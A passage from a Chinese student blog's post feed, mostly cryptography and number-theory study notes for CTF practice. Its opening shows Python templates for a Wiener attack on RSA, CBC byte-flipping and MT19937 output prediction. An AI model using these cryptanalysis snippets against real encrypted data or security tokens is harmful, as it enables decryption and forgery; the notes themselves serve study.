class="keyword">in</span> gf:</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">n=</span><br><span class="line">e=</span><br><span class="line">c=</span><br><span class="line">d=wienerAttack(e, n)</span><br><span class="line">m=<span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure><h2 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h2><p>参考<a href="https://blog.csdn.net/xiongsiqi_blog/article/details/131925246">这篇文章</a></p><p>用于CBC模式下的AES加密</p><p>个人认为上面的文章中这一段讲得已经很清楚了</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/image-20240721165239569.png" alt="image-20240721165239569"></p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a1, a2</span>): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1,b2 <span class="keyword">in</span> <span class="built_in">zip</span>(a1,a2)])</span><br><span class="line">A=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">C=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">CC=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">AA=strxor(A,C)</span><br><span class="line">AA=strxor(AA,CC)</span><br><span class="line"><span class="built_in">print</span>(AA)</span><br></pre></td></tr></table></figure><h2 id="MT19937伪随机数预测"><a href="#MT19937伪随机数预测" class="headerlink" title="MT19937伪随机数预测"></a>MT19937伪随机数预测</h2><p>MT19937，即梅森旋转算法，是一种伪随机数的生成算法，python中的random模块生成“随机数”时使用的就是这种算法。</p><p>根据其原理，有一个叫randcrack的python模块可以对其生成的“随机数”进行预测，前提是需要已知已经生成的至少624个32位二进制数，这样才能预测出下一个生成的数会是多少。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand=[] <span class="comment">#624个32位二进制数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(Rand[i])</span><br><span class="line">pre=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(pre)</span><br></pre></td></tr></table></figure><p>那么前面给出的是312个64位数呢？</p><p>其实，random生成64位数的方式就是先生成2个32位数，然后将它们拼起来得到的。因此我们只需要把这个64位数拆开成两个32位数即可。</p><p>实现代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">Rand= [] <span class="comment">#312个64位数</span></span><br><span class="line">prng=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Rand:</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&amp; (<span class="number">2</span> ** <span class="number">32</span> - <span class="number">1</span>))</span><br><span class="line">    prng.append(<span class="built_in">int</span>(i)&gt;&gt; <span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">    rc.submit(prng[i])</span><br><span class="line">notrandom=rc.predict_getrandbits(<span class="number">100</span>) <span class="comment">#假设要预测的是下一个100位二进制数</span></span><br><span class="line"><span class="built_in">print</span>(notrandom)</span><br></pre></td></tr></table></figure><h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><p>参考<a href="https://blog.csdn.net/weixin_45883223/article/details/115299389">这篇文章</a>和<a href="https://blog.csdn.net/superprintf/article/details/108964563">这篇文章</a></p><p>LCG，线性同余法，是一种生成伪随机数的方法，用一个公式来概括就是<br>$$<br>X_{n+1}&#x3D;(aX_n+b)\ mod\ m<br>$$<br>基本围绕以下四个公式，即可解决各类基础的LCG问题</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%97%E6%B3%95%E6%95%A3%E8%AE%B0/c00bad18-4f1e-4719-81d0-526a8db7030c.png" alt="c00bad18-4f1e-4719-81d0-526a8db7030c"></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学基础散记</title>
      <link href="/2024/03/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/"/>
      <url>/2024/03/06/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在这里零散地记载一些遇到的密码学相关知识<del>（当裁缝）</del></p></blockquote><h2 id="威尔逊定理"><a href="#威尔逊定理" class="headerlink" title="威尔逊定理"></a>威尔逊定理</h2><p>任一素数减去1的阶乘与-1模该素数同余。即对于任何素数p，都有<br>$$<br>(p-1)!+1\equiv 0(mod\ p)<br>$$</p><h3 id="引理"><a href="#引理" class="headerlink" title="引理"></a>引理</h3><p>设p是素数，f(x)是整系数多项式，再设a1,a2,…,an两两对模不同余，满足<br>$$<br>f(a_j)\equiv 0(mod\ p),1\leq j\leq n<br>$$<br>则存在整系数多项式q(x)，使得<br>$$<br>f(x)\equiv q(x)(x-a_1)(x-a_2)…(x-a_n)(mod\ p)<br>$$<br>由此可进一步推知，<br>$$<br>x^{p-1}-1\equiv (x-1)…(x-p+1)(mod\ p)<br>$$</p><h2 id="群论"><a href="#群论" class="headerlink" title="群论"></a>群论</h2><p>参考了百度百科和<a href="https://blog.csdn.net/chenxy_bwave/article/details/122702319?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170972835316800226592151%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170972835316800226592151&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122702319-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%BE%A4%E8%AE%BA&spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="二元运算"><a href="#二元运算" class="headerlink" title="二元运算"></a>二元运算</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306205145595.png" alt="image-20240306205145595"></p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306205505241.png" alt="image-20240306205505241"></p><h3 id="循环群"><a href="#循环群" class="headerlink" title="循环群"></a>循环群</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%A3%E8%AE%B0/image-20240306210708812.png" alt="image-20240306210708812"></p><h3 id="阿贝尔群"><a href="#阿贝尔群" class="headerlink" title="阿贝尔群"></a>阿贝尔群</h3><p>若一个群满足交换律，则称其为阿贝尔群，也称为交换群。</p><h3 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h3><p>设(M,<em>)和(S,·)是两个群，σ:M→S，∀a,b∈M，有σ(a</em>b)&#x3D;σ(a)·σ(b)，则称σ为M到S的同态或群映射。</p><p>也就是说，先运算再映射和先映射再运算得到的结果相等。</p><p>如果为单射，则称为单同态。</p><h3 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h3><p>如果一个同态映射可逆（双射），则称这两个群同构。</p><h3 id="半群"><a href="#半群" class="headerlink" title="半群"></a>半群</h3><p>只满足定义中的1、2两条</p><h2 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h2><p>当模m有原根时，设l为模m的一个原根，则当x&#x3D;l^k mod m时，<br>$$<br>Ind_lx\equiv k(mod\ \phi(m))<br>$$<br>离散对数和一般的对数有着相类似的性质：<br>$$<br>Ind_lxy\equiv Ind_lx+Ind_ly(mod\ \phi(m))<br>$$</p><p>$$<br>Ind_lx^y\equiv yInd_lx(mod\ \phi(m))<br>$$</p><p>在程序中，我们可以用sympy库中的discrete_log函数来实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">x=</span><br><span class="line">y=</span><br><span class="line">z=</span><br><span class="line">e=sympy.discrete_log(x,y,z)  <span class="comment">##求e，discrete_log(x,y,z)，x为模，y为余数，z为底数 </span></span><br></pre></td></tr></table></figure><h2 id="环和域"><a href="#环和域" class="headerlink" title="环和域"></a>环和域</h2><p>需要结合上面说到的群论来看，参考了这篇文章](<a href="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170980296016800184186780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%8E%AF&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170980296016800184186780&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142^v99^pc_search_result_base7&amp;utm_term=%E7%8E%AF&amp;spm=1018.2226.3001.4187</a>)</p><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307204549987.png" alt="image-20240307204549987"></p><h3 id="交换环-含幺环-交换含幺环"><a href="#交换环-含幺环-交换含幺环" class="headerlink" title="交换环 含幺环 交换含幺环"></a>交换环 含幺环 交换含幺环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307204829672.png" alt="image-20240307204829672"></p><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205000778.png" alt="image-20240307205000778"></p><h3 id="无零因子环和含零因子环"><a href="#无零因子环和含零因子环" class="headerlink" title="无零因子环和含零因子环"></a>无零因子环和含零因子环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205056700.png" alt="image-20240307205056700"></p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205356769.png" alt="image-20240307205356769"></p><p>在有限含幺环中，无零因子等同于(非零元)有逆元。</p><h3 id="整环（整区）"><a href="#整环（整区）" class="headerlink" title="整环（整区）"></a>整环（整区）</h3><p>交换含幺的无零因子环称为整环。</p><h3 id="除环"><a href="#除环" class="headerlink" title="除环"></a>除环</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205340140.png" alt="image-20240307205340140"></p><p>除环是含幺的无零因子环。</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>接上面的环，参考了百度百科和<a href="https://blog.csdn.net/qq_51819011/article/details/129884474?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170980296016800184186780%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170980296016800184186780&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-129884474-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%E7%8E%AF&spm=1018.2226.3001.4187">这篇文章</a></p><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307205839086.png" alt="image-20240307205839086"></p><p>可以说，可交换的除环是域，或有限整环是域</p><p>百度百科上的描述也不错</p><p><img src="/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%95%A3%E8%AE%B0/image-20240307211359034.png" alt="image-20240307211359034"></p><h3 id="有限域（伽罗瓦域）"><a href="#有限域（伽罗瓦域）" class="headerlink" title="有限域（伽罗瓦域）"></a>有限域（伽罗瓦域）</h3><p>如果域F只包含有限个元素，则称其为有限域。有限域中元素的个数称为有限域的阶。有限域的特征数必为某一素数p，因此它含的素域同构于Zp。若F是特征为p的有限域，则F中元素的个数为pⁿ,n为某一正整数。元素个数相同的有限域是同构的。因此，通常用GF(pⁿ)表示pⁿ元的有限域。GF(pⁿ)的乘法群是(pⁿ-1)阶的循环群。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qsnCTF2024 Round1 Writeup</title>
      <link href="/2024/03/01/qsnCTF2024%20Round1-Writeup/"/>
      <url>/2024/03/01/qsnCTF2024%20Round1-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/qsnCTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“小光的答案之书” in “Misc” was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> qsnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《初等数论》学习笔记</title>
      <link href="/2024/02/24/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/24/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从今天开始，不间断地更新一些《初等数论》学习笔记，简单打一下密码学的基础<del>（为了密码学不爆零T0T）</del></p></blockquote><h2 id="第一章-整数的整除性"><a href="#第一章-整数的整除性" class="headerlink" title="第一章 整数的整除性"></a>第一章 整数的整除性</h2><h3 id="gcd-a-b-gcd-b-r"><a href="#gcd-a-b-gcd-b-r" class="headerlink" title="gcd(a,b)&#x3D;gcd(b,r)"></a>gcd(a,b)&#x3D;gcd(b,r)</h3><p>假设a和b都是整数，且a&gt;b</p><p><strong>a&#x3D;bq+r</strong>, 0&lt;r&lt;b</p><p>其中q和r都是正整数，则a和b的最大公因数等于b和r的最大公因数，即</p><p><strong>gcd(a,b) &#x3D; gcd(b,r)</strong></p><h3 id="欧几里得算法（辗转相除法）"><a href="#欧几里得算法（辗转相除法）" class="headerlink" title="欧几里得算法（辗转相除法）"></a>欧几里得算法（辗转相除法）</h3><p>利用上述性质，我们可以用欧几里得算法来求两个较大数的最大公因数。用语言通俗地表达，就是先用较大数除以较小数，然后用上一个式子的除数除以上一个式子的余数，如此反复至余数为0，最后一个式子的除数即为最大公因数。</p><p>百度百科中的这张图较好地解释了其中原理：</p><img src="/images/《初等数论》学习笔记/辗转相除.webp" alt="辗转相除" style="zoom:50%;" /><p>下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        a, b = b % a, a</span><br><span class="line">    <span class="keyword">return</span> b</span><br></pre></td></tr></table></figure><h3 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h3><p>看书上都没有讲，但是也很重要，这里补充一下。</p><p>这个算法在用辗转相除法找到gcd(a,b)的前提下，还能找到x,y，使得ax+by&#x3D;gcd(a,b)。（根据贝祖&#x2F;裴蜀定理，x和y总是存在）</p><p>具体原理引用这篇文章来讲<a href="https://blog.csdn.net/qq_37701948/article/details/132716594">https://blog.csdn.net/qq_37701948/article/details/132716594</a></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240224212552584.png" alt="image-20240224212552584"></p><p>如此可以得到欧几里得算法中前后两步之间x和y的关系，已知最后一步时b&#x3D;0，于是可以以此倒推出原来的x和y，下面是一个简单的python函数实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ext_euclid</span>(<span class="params">a, b</span>):     </span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:         </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a     </span><br><span class="line">    <span class="keyword">else</span>:         </span><br><span class="line">        x, y, q = ext_euclid(b, a % b) </span><br><span class="line">        <span class="comment"># q = gcd(a, b) = gcd(b, a%b)         </span></span><br><span class="line">        x, y = y, (x - (a // b) * y)         </span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br></pre></td></tr></table></figure><p>特别地，当a和b互素的时候，gcd(a,b)&#x3D;1，因此要求的就是能使ax+by&#x3D;1成立的x和y。这里的x其实就是a的模反元素（模逆元），在RSA解密中有着重要作用，以后的文章中再做详细的描述。</p><h3 id="ab-dm"><a href="#ab-dm" class="headerlink" title="ab&#x3D;dm"></a>ab&#x3D;dm</h3><p>假设a和b都是正整数，a和b的最大公因数是d而a和b的最小公倍数是m，即(a,b)&#x3D;d而{a,b}&#x3D;m，则我们有</p><p>ab&#x3D;dm</p><p>这可以用来更快捷地求出大数的最小公倍数：我们可以先试用欧几里得算法求出最大公因数，所以m&#x3D;ab&#x2F;d</p><h2 id="第二章-数的进位法"><a href="#第二章-数的进位法" class="headerlink" title="第二章 数的进位法"></a>第二章 数的进位法</h2><h3 id="求补码"><a href="#求补码" class="headerlink" title="求补码"></a>求补码</h3><p>对于二进制数(a1a2…an)2，当n≥3时，可用如下方法快速求补码</p><h4 id="当an-1时"><a href="#当an-1时" class="headerlink" title="当an&#x3D;1时"></a>当an&#x3D;1时</h4><p>除an不变，在a1,a2,…an-1中所有ai是0的都变成1，而所有ai是1的都变成0。由这种方法所得到的二进制数就是(a1a2…an)2的补码</p><h4 id="当an-0时"><a href="#当an-0时" class="headerlink" title="当an&#x3D;0时"></a>当an&#x3D;0时</h4><p>在(a1a2…an)2中从右往左看，则在出现1以前所有的0及其第一次出现的1都不变，而后各数遇0变成1，遇1则变成0.用这种方法所得到的二进制数就是(a1a2…an)2的补码。</p><h3 id="利用补码来进行二进制数减法运算"><a href="#利用补码来进行二进制数减法运算" class="headerlink" title="利用补码来进行二进制数减法运算"></a>利用补码来进行二进制数减法运算</h3><p>先求减数的补码，用被减数加上补码再减去减数</p><h2 id="第三章-一部分不定方程"><a href="#第三章-一部分不定方程" class="headerlink" title="第三章 一部分不定方程"></a>第三章 一部分不定方程</h2><h3 id="一元不定方程"><a href="#一元不定方程" class="headerlink" title="一元不定方程"></a>一元不定方程</h3><p>设n≥2，而n,a0,a1,…,an都是整数，求出关于整数系数的n次方程<br>$$<br>a_nx^n+a_{n-1}x^{n-1}+…+a_1x+a_0&#x3D;0<br>$$<br>设x&#x3D;α是其整数解，那么<br>$$<br>a_n\alpha^n+a_{n-1}\alpha^{n-1}+…+a_1\alpha+a_0&#x3D;0<br>$$</p><p>$$<br>a_0&#x3D;-\alpha(a_n\alpha^{n-1}+a_{n-1}\alpha^{n-2}+…+a_1)<br>$$</p><p>所以只要能从a0中挑选出能使原式成立的因数，即为原式的整数解，否则无整数解</p><h3 id="二元一次不定方程"><a href="#二元一次不定方程" class="headerlink" title="二元一次不定方程"></a>二元一次不定方程</h3><h4 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h4><p>设二元一次不定方程ax+by&#x3D;c（其中a,b,c都是正整数而gcd(a,b)&#x3D;1，有一组整数解x&#x3D;x0,y&#x3D;y0，则其一切整数解可以表示成<br>$$<br>\begin{cases} x&#x3D;x_0-bt \ y&#x3D;y_0+at \end{cases}<br>$$<br>其中t&#x3D;0,±1,±2,±3,…</p><h4 id="求ax-by-c的一切整数解"><a href="#求ax-by-c的一切整数解" class="headerlink" title="求ax+by&#x3D;c的一切整数解"></a>求ax+by&#x3D;c的一切整数解</h4><p>假设gcd(a,b)&#x3D;1，</p><p>先求ax+by&#x3D;1的解，可利用第一章中所述之扩展欧几里得算法，得到解x&#x3D;x0,y&#x3D;y0.</p><p>所以ax+by&#x3D;c(ax0+by0)，</p><p>所以x&#x3D;cx0,y&#x3D;cy0.</p><p>由上述定理得，x&#x3D;cx0-bt，y&#x3D;cy0+at，其中t&#x3D;0,±1,±2,±3,…</p><p>如果放在实际应用问题中，要记得注意定义域。</p><h3 id="费马大定理"><a href="#费马大定理" class="headerlink" title="费马大定理"></a>费马大定理</h3><p>当n是一个大于2的正整数时，则<br>$$<br>x^n+y^n&#x3D;z^n<br>$$<br>这个不定方程没有正整数解。</p><h2 id="第四章-一次同余式及解法"><a href="#第四章-一次同余式及解法" class="headerlink" title="第四章 一次同余式及解法"></a>第四章 一次同余式及解法</h2><h3 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h3><p>如果a和b都是整数而m是一个固定的正整数，则当m|(a-b)（即m能够整除a-b）时，我们就说a,b对模m同余，记作<br>$$<br>a\equiv b(mod\ m)<br>$$</p><h3 id="一些结论"><a href="#一些结论" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>当a是整数而m是一个正整数时，则有<br>$$<br>a\equiv a(mod\ m)<br>$$</p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>如果a,b都是整数而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立时，我们有<br>$$<br>b\equiv a(mod\ m)<br>$$</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>如果a,b,c都是整数而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>b\equiv c(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a\equiv c(mod\ m)<br>$$</p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>c\equiv d(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a+c\equiv b+d(mod\ m)<br>$$</p><p>$$<br>a-c\equiv b-d(mod\ m)<br>$$</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>如果a,b,c都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$<br>成立，我们有<br>$$<br>ac\equiv bc(mod\ m)<br>$$</p><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>如果a,b,c,d都是整数，而m是一个正整数，则当<br>$$<br>a\equiv b(mod\ m)<br>$$</p><p>$$<br>c\equiv d(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>ac\equiv bd(mod\ m)<br>$$</p><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>如果a,b都是整数，而m和n都是正整数，则当<br>$$<br>a\equiv b(mod m)<br>$$<br>成立时，我们有<br>$$<br>a^n\equiv b^n(mod\ m)<br>$$</p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>如果a1,a2,…an,b1,b2,…bn都是整数，而m和n都是正整数，则当<br>$$<br>a_1\equiv b_1(mod\ m)<br>$$</p><p>$$<br>a_2\equiv b_2(mod\ m)<br>$$</p><p>​……<br>$$<br>a_n\equiv b_n(mod\ m)<br>$$</p><p>都成立时，我们有<br>$$<br>a_1+a_2+…+a_n\equiv b_1+b_2+…+b_n(mod\ m)<br>$$</p><h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>按照通常方法，把一个正整数a写成十进位数的形式，即<br>$$<br>a&#x3D;a_n10^n+a_{n-1}10^{n-1}+…+a_0,0\leq a_i&lt;10<br>$$<br>当9能够整除an+an-1+…+a0时，则我们有9能够整除a</p><h3 id="弃九法"><a href="#弃九法" class="headerlink" title="弃九法"></a>弃九法</h3><p>$$<br>a&#x3D;a_n10^n+a_{n-1}10^{n-1}+…+a_0<br>$$</p><p>$$<br>b&#x3D;b_m10^m+b_{m-1}10^{m-1}+…+b_0<br>$$</p><p>$$<br>ab&#x3D;P<br>$$</p><p>$$<br>P&#x3D;c_l10^l+c_{l-1}10^{l-1}+…c_0<br>$$</p><p>由上面的结论，我们可以得到<br>$$<br>a\equiv a_n+a_{n-1}+…+a_0(mod\ 9)<br>$$</p><p>$$<br>b\equiv b_n+b_{n-1}+…+b_0(mod\ 9)<br>$$</p><p>$$<br>P\equiv c_n+c_{n-1}+…+c_0(mod\ 9)<br>$$</p><p>进而得到<br>$$<br>(a_n+a_{n-1}+…+a_0)(b_m+b_{m-1}+…+b_0)\equiv c_l+c_{l-1}+…+c_0(mod\ 9)<br>$$<br>如果an,an-1,…a0,bm,bm-1,…b0,cl,cl-1,…c0中有9出现，可以把9去掉</p><h3 id="一次同余式"><a href="#一次同余式" class="headerlink" title="一次同余式"></a>一次同余式</h3><p>如果a,b都是整数，而m是一个正整数，当a mod m ≠0时，我们把<br>$$<br>ax+b\equiv 0(mod\ m)<br>$$<br>叫做模m的一次同余式</p><h3 id="一些结论-1"><a href="#一些结论-1" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h4><p>如果c能使ac+b mod m&#x3D;0成立，则x mod m &#x3D;c的一切整数x都能使其成立，也就是上式的一个解</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><p>当gcd(a.m)不能够整除b时，则一次同余式<br>$$<br>ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0<br>$$<br>没有整数解</p><h4 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h4><p>当gcd(a,m)&#x3D;1时，则一次同余式<br>$$<br>ax+b\equiv 0(mod\ m),a\ mod\ m\neq 0<br>$$<br>有整数解</p><h4 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h4><p>如果ad mod md &#x3D;bd，则有a mod m&#x3D;b</p><img src="/images/《初等数论》学习笔记/image-20240229000118869.png" alt="image-20240229000118869"  /><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240229000135048.png" alt="image-20240229000135048"></p><h3 id="孙子定理（中国剩余定理）"><a href="#孙子定理（中国剩余定理）" class="headerlink" title="孙子定理（中国剩余定理）"></a>孙子定理（中国剩余定理）</h3><p>如果k≥2，而m1,m2,…mk是两个两两互素的k个正整数，也就是说，在这k个正整数中任意取出两个正整数来，则这两个正整数是互素的，令<br>$$<br>M&#x3D;m_1m_2…m_k&#x3D;m_1M_1&#x3D;m_2M_2&#x3D;…&#x3D;m_kM_k<br>$$<br>则同时满足同余式组<br>$$<br>x\equiv b_1(mod\ m_1),x\equiv b_2(mod\ m_2),…,x\equiv b_k(mod\ m_k)<br>$$<br>的正整数解是<br>$$<br>x\equiv 